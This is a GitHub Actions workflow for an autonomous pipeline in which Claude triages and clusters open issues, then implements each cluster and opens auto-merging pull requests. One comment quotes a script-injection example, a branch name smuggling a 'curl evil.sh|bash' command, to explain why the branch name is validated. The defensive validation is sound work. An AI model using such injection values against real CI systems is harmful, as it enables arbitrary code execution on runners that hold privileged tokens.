name: Issue build — select buildable issues, cluster related ones, one PR per cluster (reusable)

# The BUILDER — second and final stage of the backlog pipeline (propose -> build).
# fixer.yml proposes work as issues; this selects the buildable ones, groups related ones,
# and ships a PR per group. As of the three-loop rework (docs/design/three-loop-pipeline.md,
# 2026-07-15) the separate Opus `triage` stage is gone: its buildable-vs-needs-human call
# folded into this workflow's read-only cluster pass, and the whole `confidence:high|medium|low`
# taxonomy was deleted. It became dead weight once `automerge.yml` stopped reading labels —
# a PR now auto-merges on green + not-`hold`, so confidence gated nothing.
#
# NEVER WAITS, ALWAYS BUILDS >=1: every run, if any buildable issue exists, this produces at
# least one PR. There is no "wait for a confidence-pure cluster" gate (the old behavior that
# let the builder sit idle burning scan passes). n issues -> m clusters, never n -> 1.
#
# Two jobs:
#   cluster — a deterministic shell step selects open BUILD CANDIDATES (open, trusted author,
#             not building/hold/needs-human). One read-only Claude session then, per candidate:
#             judges buildable-vs-not, and groups the buildable ones into clusters by shared
#             signal — same files/tree, same root cause/concept, or filed in the same window.
#             It returns {clusters, needs_human} via --json-schema structured_output (never a
#             written file — see README's structured_output gotcha). A deterministic shell step
#             then labels the non-buildable ones `needs-human` and claims each clustered issue
#             (adds `building`) so a concurrent run can't double-process it. Capped at
#             MAX_CLUSTERS; truncation is logged (the rest are simply re-evaluated next run).
#   build   — matrix, one job per cluster (native Actions fan-out, no worktree juggling).
#             Fresh branch off the default branch, Claude implements the cluster's issues, runs
#             the repo's gates, pushes, opens a PR that Closes the source issues. The PR flows
#             into the normal auto-merge path (automerge.yml arms it on green; add `hold` to
#             stop that). If the gates don't pass, no PR opens — the issues get a comment and
#             their `building` claim is dropped so a later run retries them.
#
# Safe Outputs shape: every model step is READ-ONLY and returns structured data; the only
# label/issue/PR mutations happen in deterministic shell steps. See docs/design/backlog-pipeline.md.
#
# Runs on a Claude Pro/Max subscription (CLAUDE_CODE_OAUTH_TOKEN), not a metered
# ANTHROPIC_API_KEY — inert until that secret is set.
#
# Caller (batched schedule + manual dispatch — NOT an `issues:` trigger; per-event fan-out
# caused the 77-parallel-session incident, SuxOS/.github#140):
#   uses: SuxOS/.github/.github/workflows/issue-build.yml@main
#   with: { gates-summary: "..." }
#   secrets: inherit

on:
  workflow_call:
    inputs:
      max-clusters:
        type: number
        # Per-run build fan-out cap (truncation logged; the rest are re-evaluated next run).
        # Bounds spend, never safety.
        default: 20
      max-candidates:
        description: "Cap open issues fed to the cluster pass per run, oldest-first — bounds the model's input size and per-run spend; the rest wait for the next run."
        type: number
        default: 50
      cluster-model:
        type: string
        # sonnet: this pass now does buildability triage + grouping, but neither authorizes an
        # unattended merge anymore (CI + security-review gate every merge) — so it's bulk-tier
        # judgment, not the old merge-gating Opus call. See docs/design/three-loop-pipeline.md.
        default: "sonnet"
      build-model:
        type: string
        # sonnet: build output is gated by CI + security-review on the resulting PR, and Sonnet
        # is near-Opus on codegen at a fraction of the subscription budget. Scarce Opus budget
        # goes to the nightly deep-audit / weekly org-consistency passes instead.
        default: "sonnet"
      build-max-turns:
        type: number
        default: 60
      gates-summary:
        description: "Human-readable list of gates each build session's change must pass before it pushes."
        type: string
        default: "the repo's lint/type-check/test/build commands"

permissions:
  contents: write
  pull-requests: write
  issues: write
  actions: read

concurrency:
  group: issue-build-${{ github.workflow }}
  cancel-in-progress: false

jobs:
  cluster:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    # Narrower than the workflow-level grant: this job only reads issues (via its own minted
    # App token) and checks out read-only. The build job below keeps the broad write grant.
    permissions:
      contents: read
    outputs:
      plan: ${{ steps.plan.outputs.clusters }}
    steps:
      - name: Preflight — need the token
        id: pre
        run: |
          if [ "${{ secrets.CLAUDE_CODE_OAUTH_TOKEN != '' }}" != "true" ]; then
            echo "CLAUDE_CODE_OAUTH_TOKEN not set → issue-build inert"; echo "go=false" >> "$GITHUB_OUTPUT"
          else echo "go=true" >> "$GITHUB_OUTPUT"; fi

      # Budget governor signal (docs/design/budget-and-cadence.md). Builds drain the in-flight
      # backlog, so they keep running at yellow and stand down only at red. Gating the cluster
      # job gates the whole workflow: no plan → empty build matrix.
      - name: Check autonomy throttle
        id: throttle
        uses: SuxOS/.github/.github/actions/check-throttle@main
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          defer-at: "red"

      - name: Mint app token
        if: steps.pre.outputs.go == 'true' && steps.throttle.outputs.go == 'true'
        id: app-token
        uses: SuxOS/.github/.github/actions/mint-app-token@main
        with:
          app-id: ${{ secrets.SUX_BOT_APP_ID }}
          private-key: ${{ secrets.SUX_BOT_PRIVATE_KEY }}

      # Reap orphaned claims + select this run's candidates, BEFORE the expensive Claude call.
      #  1. Reap: an issue stuck in `building` with no activity for >REAP_STALE_HOURS is an
      #     orphan from a build run that crashed after claiming but before opening its PR —
      #     drop the claim so it's a candidate again. (Self-healing; no separate cron.)
      #  2. Select: open issues from a TRUSTED author (the org bot's proposals, or an
      #     OWNER/MEMBER/COLLABORATOR — the actor gate, since an untriaged issue body is
      #     attacker-influenceable input into an autonomous build), carrying none of
      #     building/hold/needs-human. Capped oldest-first to MAX_CANDIDATES. If none, the
      #     Claude call is skipped entirely (cheap exit, no LLM spend).
      - name: Reap stale claims and select build candidates
        id: queue
        if: steps.pre.outputs.go == 'true' && steps.throttle.outputs.go == 'true'
        env:
          GH_TOKEN: ${{ steps.app-token.outputs.token }}
          REAP_STALE_HOURS: "2"
          MAX_CANDIDATES: ${{ inputs.max-candidates }}
        run: |
          set -euo pipefail
          now=$(date -u +%s)
          if ! stale_rows=$(gh issue list --repo "$GITHUB_REPOSITORY" --state open --label building \
              --json number,updatedAt --jq '.[] | [.number,.updatedAt] | @tsv'); then
            echo "::error::gh issue list (label:building) failed — aborting instead of silently skipping the reap"
            exit 1
          fi
          if [ -n "$stale_rows" ]; then
            while IFS=$'\t' read -r n upd; do
              age_h=$(( (now - $(date -u -d "$upd" +%s 2>/dev/null || echo "$now")) / 3600 ))
              if [ "$age_h" -ge "$REAP_STALE_HOURS" ]; then
                echo "reaping orphaned building issue #$n (idle ${age_h}h)"
                gh issue edit "$n" --repo "$GITHUB_REPOSITORY" --remove-label building 2>/dev/null || true
              fi
            done <<< "$stale_rows"
          fi

          # `gh issue list --json` has no author_association field, so read the REST issues
          # endpoint (it returns it per-issue) and exclude entries with a `pull_request` key
          # (that endpoint lists PRs too). A label-set predicate is more robust than a search
          # string. Cap oldest-first so a proposal burst can't blow the budget in one run.
          if ! all=$(gh api "repos/${GITHUB_REPOSITORY}/issues?state=open&per_page=100" --paginate); then
            echo "::error::gh api issues list failed — aborting instead of treating as zero candidates"
            exit 1
          fi
          picked=$(printf '%s' "$all" | jq -sc --argjson n "$MAX_CANDIDATES" '
            [ .[][]
              | select(has("pull_request") | not)
              | (.labels | map(.name)) as $l
              | select(([ "building","hold","needs-human" ] - $l) | length == 3)
              | select((.author_association | IN("OWNER","MEMBER","COLLABORATOR")) or (.user.login == "suxbot[bot]"))
            ] | sort_by(.number) | .[0:$n] | map(.number)')
          count=$(echo "$picked" | jq 'length')
          echo "build candidates ($count): $picked"
          echo "numbers=$picked" >> "$GITHUB_OUTPUT"
          echo "count=$count" >> "$GITHUB_OUTPUT"

      - name: Checkout
        if: steps.pre.outputs.go == 'true' && steps.throttle.outputs.go == 'true' && steps.queue.outputs.count != '0'
        # Default (shallow) depth: this job's allowedTools is gh/issue read only — no git.
        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0

      - name: Claude — triage buildability and cluster the backlog
        id: claude
        if: steps.pre.outputs.go == 'true' && steps.throttle.outputs.go == 'true' && steps.queue.outputs.count != '0'
        # The action hard-fails (exit 1) when the model ends its turn without emitting
        # --json-schema structured_output. continue-on-error lets "Cap and claim" below treat
        # an empty verdict as clusters=[] (build job skips cleanly). Same shape as #139.
        continue-on-error: true
        uses: anthropics/claude-code-action@f1bd27ca5b54584506e40e17884d90bdaaa1a9b3 # v1
        env:
          CANDIDATE_NUMBERS: ${{ steps.queue.outputs.numbers }}
          ENABLE_PROMPT_CACHING_1H: "1"
        with:
          claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
          github_token: ${{ steps.app-token.outputs.token }}
          allowed_bots: suxbot[bot]
          prompt: |
            These open issues are build candidates: $CANDIDATE_NUMBERS
            View each with `gh issue view <n> --json number,title,body,labels` and read enough of
            the code to judge it. Whoever filed it (the fixer bot or a human) is irrelevant — judge
            the substance.

            Do TWO things:

            1. BUILDABILITY. For each candidate decide: can an unattended coding session actually
               ship this? DEFAULT TO YES — the aim is that most work drains autonomously, and CI +
               security-review gate every resulting PR, so you don't need certainty to let it
               through. Mark an issue non-buildable ONLY when a session genuinely can't do it: a
               question, a duplicate, needs credentials/private access/a human decision, or too
               vague or sprawling to attempt safely. Put non-buildable ones in `needs_human` with a
               one-line `reason`; leave everything else for clustering.

            2. CLUSTER the buildable ones. Group RELATED issues — same files/tree, same root cause
               or feature area, or a dependency between them — so each cluster becomes one small,
               coherent, reviewable PR. Two issues that would touch the same files MUST share a
               cluster (concurrent sessions editing the same lines just collide). Two unrelated
               issues MUST NOT. An issue related to nothing is its own single-issue cluster —
               but before making a singleton, actively check it against the others for a shared
               signal and group it if one exists. Never put everything in one cluster: n issues
               -> m clusters, m > 1 whenever the backlog holds unrelated work.

            For each cluster: a short kebab-case `id`, a `branch` like `bot/issue-build-<id>`, a
            conventional-commit `title` for the PR, a one-paragraph `summary`, and its
            `issue_numbers`. Do not modify any issue and do not write code here.

            Your FINAL message MUST be the machine-readable object matching the JSON schema:
            {"clusters":[...],"needs_human":[...]} — empty arrays if nothing applies. Emit it as
            your structured output; do NOT end with a prose summary and do NOT write any file. A
            run that ends without this object builds nothing and wastes the session.
          # Read-only: views issues, returns a plan. All mutation is in the deterministic shell
          # step below. Restrict tools to read + the `gh issue` read subcommands it calls.
          claude_args: >-
            --max-turns 12 --model ${{ inputs.cluster-model }}
            --allowedTools "Read,Grep,Glob,Bash(gh issue list:*),Bash(gh issue view:*)"
            --json-schema '{"type":"object","properties":{"clusters":{"type":"array","items":{"type":"object","properties":{"id":{"type":"string"},"branch":{"type":"string"},"title":{"type":"string"},"summary":{"type":"string"},"issue_numbers":{"type":"array","items":{"type":"integer"}}},"required":["id","branch","title","summary","issue_numbers"],"additionalProperties":false}},"needs_human":{"type":"array","items":{"type":"object","properties":{"number":{"type":"integer"},"reason":{"type":"string"}},"required":["number","reason"],"additionalProperties":false}}},"required":["clusters","needs_human"],"additionalProperties":false}'

      - name: Claude — triage buildability and cluster (retry — first attempt produced no output)
        id: claude_retry
        # Fires only when the first attempt emitted no structured_output — a transient blip or a
        # model that ended without the tool call. One retry auto-recovers; a genuinely empty pass
        # still yields nothing and the Cap step sets clusters=[]. Mirrors #139.
        if: steps.pre.outputs.go == 'true' && steps.throttle.outputs.go == 'true' && steps.queue.outputs.count != '0' && steps.claude.outputs.structured_output == ''
        continue-on-error: true
        uses: anthropics/claude-code-action@f1bd27ca5b54584506e40e17884d90bdaaa1a9b3 # v1
        env:
          CANDIDATE_NUMBERS: ${{ steps.queue.outputs.numbers }}
          ENABLE_PROMPT_CACHING_1H: "1"
        with:
          claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
          github_token: ${{ steps.app-token.outputs.token }}
          allowed_bots: suxbot[bot]
          prompt: |
            These open issues are build candidates: $CANDIDATE_NUMBERS
            View each with `gh issue view <n> --json number,title,body,labels` and read enough of
            the code to judge it. Whoever filed it (the fixer bot or a human) is irrelevant — judge
            the substance.

            Do TWO things:

            1. BUILDABILITY. For each candidate decide: can an unattended coding session actually
               ship this? DEFAULT TO YES — the aim is that most work drains autonomously, and CI +
               security-review gate every resulting PR, so you don't need certainty to let it
               through. Mark an issue non-buildable ONLY when a session genuinely can't do it: a
               question, a duplicate, needs credentials/private access/a human decision, or too
               vague or sprawling to attempt safely. Put non-buildable ones in `needs_human` with a
               one-line `reason`; leave everything else for clustering.

            2. CLUSTER the buildable ones. Group RELATED issues — same files/tree, same root cause
               or feature area, or a dependency between them — so each cluster becomes one small,
               coherent, reviewable PR. Two issues that would touch the same files MUST share a
               cluster (concurrent sessions editing the same lines just collide). Two unrelated
               issues MUST NOT. An issue related to nothing is its own single-issue cluster —
               but before making a singleton, actively check it against the others for a shared
               signal and group it if one exists. Never put everything in one cluster: n issues
               -> m clusters, m > 1 whenever the backlog holds unrelated work.

            For each cluster: a short kebab-case `id`, a `branch` like `bot/issue-build-<id>`, a
            conventional-commit `title` for the PR, a one-paragraph `summary`, and its
            `issue_numbers`. Do not modify any issue and do not write code here.

            Your FINAL message MUST be the machine-readable object matching the JSON schema:
            {"clusters":[...],"needs_human":[...]} — empty arrays if nothing applies. Emit it as
            your structured output; do NOT end with a prose summary and do NOT write any file. A
            run that ends without this object builds nothing and wastes the session.
          claude_args: >-
            --max-turns 12 --model ${{ inputs.cluster-model }}
            --allowedTools "Read,Grep,Glob,Bash(gh issue list:*),Bash(gh issue view:*)"
            --json-schema '{"type":"object","properties":{"clusters":{"type":"array","items":{"type":"object","properties":{"id":{"type":"string"},"branch":{"type":"string"},"title":{"type":"string"},"summary":{"type":"string"},"issue_numbers":{"type":"array","items":{"type":"integer"}}},"required":["id","branch","title","summary","issue_numbers"],"additionalProperties":false}},"needs_human":{"type":"array","items":{"type":"object","properties":{"number":{"type":"integer"},"reason":{"type":"string"}},"required":["number","reason"],"additionalProperties":false}}},"required":["clusters","needs_human"],"additionalProperties":false}'

      - name: Cap cluster count, mark needs-human, claim clustered issues
        id: plan
        if: steps.pre.outputs.go == 'true' && steps.throttle.outputs.go == 'true' && steps.queue.outputs.count != '0'
        env:
          GH_TOKEN: ${{ steps.app-token.outputs.token }}
          # Read from whichever attempt produced output (retry only ran if the first was empty).
          VERDICT: ${{ steps.claude.outputs.structured_output || steps.claude_retry.outputs.structured_output }}
          MAX_CLUSTERS: ${{ inputs.max-clusters }}
        run: |
          set -euo pipefail
          if [ -z "${VERDICT:-}" ]; then echo "no structured output → nothing to build"; echo "clusters=[]" >> "$GITHUB_OUTPUT"; exit 0; fi

          # Label the non-buildable ones needs-human (excluded from candidate selection next run)
          # and comment why, so they're not re-evaluated every run but a human sees them.
          echo "$VERDICT" | jq -c '.needs_human[]?' | while read -r nh; do
            n=$(echo "$nh" | jq -r '.number')
            reason=$(echo "$nh" | jq -r '.reason // ""')
            gh issue edit "$n" --repo "$GITHUB_REPOSITORY" --add-label needs-human 2>/dev/null || true
            [ -n "$reason" ] && gh issue comment "$n" --repo "$GITHUB_REPOSITORY" \
              --body "🤖 Held off autonomous build: $reason (labeled \`needs-human\`). Remove the label to let the builder retry it." 2>/dev/null || true
            echo "issue #$n → needs-human ($reason)"
          done

          total=$(echo "$VERDICT" | jq '.clusters | length')
          capped=$(echo "$VERDICT" | jq -c --argjson n "$MAX_CLUSTERS" '.clusters[0:$n]')
          kept=$(echo "$capped" | jq 'length')
          if [ "$kept" -lt "$total" ]; then
            echo "::warning::clustering plan had $total clusters, capped to $MAX_CLUSTERS — the rest are re-evaluated next run"
          fi
          echo "clusters ($kept): $(echo "$capped" | jq -c '[.[] | {id,issue_numbers}]')"

          # Claim each clustered issue (add `building`) so a concurrent run can't double-process it.
          echo "$capped" | jq -c '.[]' | while read -r c; do
            for n in $(echo "$c" | jq -r '.issue_numbers[]'); do
              gh issue edit "$n" --repo "$GITHUB_REPOSITORY" --add-label building 2>/dev/null || true
            done
          done

          echo "clusters=$capped" >> "$GITHUB_OUTPUT"

  build:
    needs: cluster
    if: needs.cluster.outputs.plan != '' && needs.cluster.outputs.plan != '[]'
    strategy:
      fail-fast: false
      matrix:
        # Default an EMPTY plan to '[]' before fromJSON. The matrix expression is evaluated at
        # job-setup time regardless of the job `if:`, so a cheap-exit run (no candidates → no
        # cluster output → plan is '') would hit fromJSON('') and fail the WHOLE run with
        # startup_failure. `|| '[]'` yields a valid empty array (zero matrix jobs) instead.
        include: ${{ fromJSON(needs.cluster.outputs.plan || '[]') }}
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - name: Mint app token
        id: app-token
        uses: SuxOS/.github/.github/actions/mint-app-token@main
        with:
          app-id: ${{ secrets.SUX_BOT_APP_ID }}
          private-key: ${{ secrets.SUX_BOT_PRIVATE_KEY }}

      - name: Checkout default branch, create cluster branch
        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0
        with:
          fetch-depth: 0
          token: ${{ steps.app-token.outputs.token }}

      - name: Create branch
        env:
          BRANCH: ${{ matrix.branch }}
        # BRANCH is Claude-authored (the cluster job's structured output, only constrained to
        # `"type":"string"` by the schema) — it MUST go through env: rather than inline ${{ }}
        # interpolation into run:, which would be a script injection (a value like
        # `foo"; curl evil.sh|bash; echo "` executing arbitrary commands on a runner holding the
        # App token). The pattern check is defense-in-depth: also refuses a value colliding with
        # a real branch (e.g. "main"), which would silently commit onto it.
        run: |
          set -euo pipefail
          if ! [[ "$BRANCH" =~ ^bot/issue-build-[A-Za-z0-9._-]+$ ]]; then
            echo "::error::cluster branch name '$BRANCH' doesn't match the expected bot/issue-build-<id> pattern — refusing to check it out"
            exit 1
          fi
          git checkout -B "$BRANCH"

      - name: Claude — implement the cluster
        id: claude
        uses: anthropics/claude-code-action@f1bd27ca5b54584506e40e17884d90bdaaa1a9b3 # v1
        env:
          ISSUE_NUMBERS: ${{ join(matrix.issue_numbers, ', ') }}
          CLUSTER_SUMMARY: ${{ matrix.summary }}
          GATES_SUMMARY: ${{ inputs.gates-summary }}
          ENABLE_PROMPT_CACHING_1H: "1"
        with:
          claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
          github_token: ${{ steps.app-token.outputs.token }}
          allowed_bots: suxbot[bot]
          prompt: |
            Implement GitHub issues #$ISSUE_NUMBERS in this repo (read each with
            `gh issue view <n>` for full detail). Summary of what this cluster covers:
            $CLUSTER_SUMMARY

            These issues were grouped together because they're related — implement all of
            them as one coherent change. This repo's gates must all pass before you commit:
              $GATES_SUMMARY
            Make the smallest correct change for each issue, run the gates locally, then
            commit (conventional-commit style message) and push to this branch. Do NOT touch
            secrets, do NOT weaken a test to make it pass, do NOT touch code unrelated to
            these issues.

            If you get all the way through and the gates pass, that's success — just finish
            normally. If you cannot get the gates passing (a genuine design problem, missing
            context, etc.), do NOT push a broken commit — say so clearly in your final
            response instead, explaining what's blocking it.
          # BUILD job: legitimately writes code and pushes a branch, so tools stay broad (no
          # --allowedTools restriction) by design — unlike the read-only cluster job above.
          claude_args: "--max-turns ${{ inputs.build-max-turns }} --model ${{ inputs.build-model }}"

      - name: Push and open PR, or comment + release claim on failure
        env:
          GH_TOKEN: ${{ steps.app-token.outputs.token }}
          BRANCH: ${{ matrix.branch }}
          TITLE: ${{ matrix.title }}
          SUMMARY: ${{ matrix.summary }}
          ISSUE_NUMBERS_JSON: ${{ toJSON(matrix.issue_numbers) }}
          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
          # Checkout above checked out the caller's actual default branch (not necessarily
          # "main"); hardcoding "main" here broke the ahead-of-base check and PR creation for
          # any caller whose default branch is named something else.
          BASE_BRANCH: ${{ github.event.repository.default_branch }}
        run: |
          set -euo pipefail
          nums=$(echo "$ISSUE_NUMBERS_JSON" | jq -r '.[]')

          # The only reliable success signal is a real commit ahead of the base branch — a
          # dirty, uncommitted working tree is ALSO a failure (Claude didn't finish committing).
          if [ -z "$(git log "origin/${BASE_BRANCH}"..HEAD 2>/dev/null)" ]; then
            echo "no commits produced for this cluster → build session reported it couldn't finish"
            for n in $nums; do
              gh issue edit "$n" --repo "$GITHUB_REPOSITORY" --remove-label building 2>/dev/null || true
              gh issue comment "$n" --repo "$GITHUB_REPOSITORY" \
                --body "🤖 Auto-build attempted this issue as part of a cluster but couldn't get the gates passing. Released the \`building\` claim so a later run retries it. Run: $RUN_URL" 2>/dev/null || true
            done
            exit 0
          fi

          git push -f origin "$BRANCH"

          closes=$(for n in $nums; do echo "Closes #$n"; done)
          body=$(printf '%s\n\n%s\n\n%s\n\nRun: %s' "$SUMMARY" "$closes" "🤖 Opened automatically by issue-build.yml." "$RUN_URL")

          # No eligibility label needed: automerge.yml arms native auto-merge on any non-draft,
          # non-hold PR once the required checks (CI + security-review) go green. Add `hold` to
          # stop that. (The old confidence-pure → automerge/needs-review labeling was removed
          # with the confidence taxonomy — see this file's header and three-loop-pipeline.md.)
          gh pr create --repo "$GITHUB_REPOSITORY" --base "$BASE_BRANCH" --head "$BRANCH" \
            --title "$TITLE" --body "$body"

          # Release the claim; the PR's `Closes #n` closes the issue on merge.
          for n in $nums; do
            gh issue edit "$n" --repo "$GITHUB_REPOSITORY" --remove-label building 2>/dev/null || true
          done
